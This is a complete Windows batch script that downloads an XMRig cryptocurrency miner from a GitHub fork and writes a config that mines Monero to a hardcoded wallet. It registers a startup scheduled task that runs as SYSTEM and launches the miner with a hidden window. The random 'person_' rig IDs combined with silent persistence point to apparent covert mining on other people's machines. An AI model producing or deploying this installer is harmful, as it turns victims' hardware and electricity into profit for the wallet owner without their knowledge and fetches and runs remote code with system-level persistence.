@echo off
setlocal

:: Check if running as administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires administrative privileges. Please run as administrator.
    pause
    exit /b 1
)

:: Step 1: Download the ZIP file of the xmrig repository from GitHub
set "url=https://github.com/Vicistar/xmrig/archive/refs/heads/main.zip"
set "zipPath=C:\win\xmrig.zip"
set "extractPath=C:\win\"

:: Create the target directory if it doesn't exist
if not exist "%extractPath%" mkdir "%extractPath%"

:: Download the ZIP file using PowerShell with progress
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%zipPath%')"
if %errorLevel% neq 0 (
    echo Failed to download the ZIP file.
    pause
    exit /b 1
)

:: Step 2: Extract the contents of the ZIP file using PowerShell
powershell -Command "Expand-Archive -Path '%zipPath%' -DestinationPath '%extractPath%'"
if %errorLevel% neq 0 (
    echo Failed to extract the ZIP file.
    pause
    exit /b 1
)
:: Create config.json file
set "configPath=%extractPath%\xmrig-main\config.json"
set "randomId=%random%%100000"
set "rigId=person_%randomId%"
(
echo {
echo    "api": {
echo        "id": null,
echo        "worker-id": null
echo    },
echo    "http": {
echo        "enabled": false,
echo        "host": "127.0.0.1",
echo        "port": 0,
echo        "access-token": null,
echo        "restricted": true
echo    },
echo    "autosave": true,
echo    "background": false,
echo    "colors": true,
echo    "title": true,
echo    "randomx": {
echo        "init": -1,
echo        "init-avx2": -1,
echo        "mode": "auto",
echo        "1gb-pages": false,
echo        "rdmsr": true,
echo        "wrmsr": true,
echo        "cache_qos": false,
echo        "numa": true,
echo        "scratchpad_prefetch_mode": 1
echo    },
echo    "cpu": {
echo        "enabled": true,
echo        "huge-pages": true,
echo        "huge-pages-jit": false,
echo        "hw-aes": null,
echo        "priority": null,
echo        "memory-pool": false,
echo        "yield": true,
echo        "asm": true,
echo        "argon2-impl": null,
echo        "argon2": [0, 2, 3],
echo        "cn": [
echo            [1, 0],
echo            [1, 2]
echo        ],
echo        "cn-heavy": [
echo            [1, 0]
echo        ],
echo        "cn-lite": [
echo            [1, 0],
echo            [1, 2],
echo            [1, 3]
echo        ],
echo        "cn-pico": [
echo            [2, 0],
echo            [2, 1],
echo            [2, 2],
echo            [2, 3]
echo        ],
echo        "cn/upx2": [
echo            [2, 0],
echo            [2, 1],
echo            [2, 2],
echo            [2, 3]
echo        ],
echo        "ghostrider": [
echo            [8, 0],
echo            [8, 2]
echo        ],
echo        "rx": [0, 2],
echo        "rx/arq": [0, 1, 2, 3],
echo        "rx/wow": [0, 2, 3],
echo        "cn-lite/0": false,
echo        "cn/0": false,
echo        "rx/keva": "rx/wow"
echo    },
echo    "opencl": {
echo        "enabled": true,
echo        "cache": true,
echo        "loader": null,
echo        "platform": "AMD",
echo        "adl": true,
echo        "cn-lite/0": false,
echo        "cn/0": false
echo    },
echo    "cuda": {
echo        "enabled": true,
echo        "loader": null,
echo        "nvml": true,
echo        "cn-lite/0": false,
echo        "cn/0": false
echo    },
echo    "log-file": null,
echo    "donate-level": 1,
echo    "donate-over-proxy": 1,
echo    "pools": [
echo        {
echo            "algo": null,
echo            "coin": "XMR",
echo            "url": "xmrpool.eu:5555",
echo            "user": "4AHxVmrWgk2SyHFLR9LoGxhW14fxe8cDQbKFfoyhWtavJVdUVREUP33jBkQtqSPfw4HZLAgEiA9SkbwXaXCqRMj44VuQ4n9",
echo            "pass": "x",
echo            "rig-id": "%rigId%",
echo            "nicehash": true,
echo            "keepalive": true,
echo            "enabled": true,
echo            "tls": false,
echo            "sni": false,
echo            "tls-fingerprint": null,
echo            "daemon": false,
echo            "socks5": null,
echo            "self-select": null,
echo            "submit-to-origin": false
echo        }
echo    ],
echo    "retries": 5,
echo    "retry-pause": 5,
echo    "print-time": 60,
echo    "health-print-time": 60,
echo    "dmi": true,
echo    "syslog": false,
echo    "tls": {
echo        "enabled": false,
echo        "protocols": null,
echo        "cert": null,
echo        "cert_key": null,
echo        "ciphers": null,
echo        "ciphersuites": null,
echo        "dhparam": null
echo    },
echo    "dns": {
echo        "ipv6": false,
echo        "ttl": 30
echo    },
echo    "user-agent": null,
echo    "verbose": 0,
echo    "watch": true,
echo    "pause-on-battery": false,
echo    "pause-on-active": false
echo }
) > "%configPath%"
:: Check if xmrig.exe exists in the specified directory
if not exist "%extractPath%\xmrig-main\xmrig.exe" (
    echo Failed to find xmrig.exe after extraction.
    pause
    exit /b 1
)

:: Step 4: Create the scheduled task to run at system startup
schtasks /create /tn "Run xmrig.exe at Startup" /tr "%extractPath%\xmrig-main\xmrig_bg.cmd" /sc onstart /ru SYSTEM /f
if %errorLevel% neq 0 (
    echo Failed to create scheduled task.
    pause
    exit /b 1
)
rem Run xmrig.exe in the background using PowerShell
powershell -Command "Start-Process '%extractPath%\xmrig-main\xmrig.exe' -WindowStyle Hidden"

echo Setup completed successfully.
pause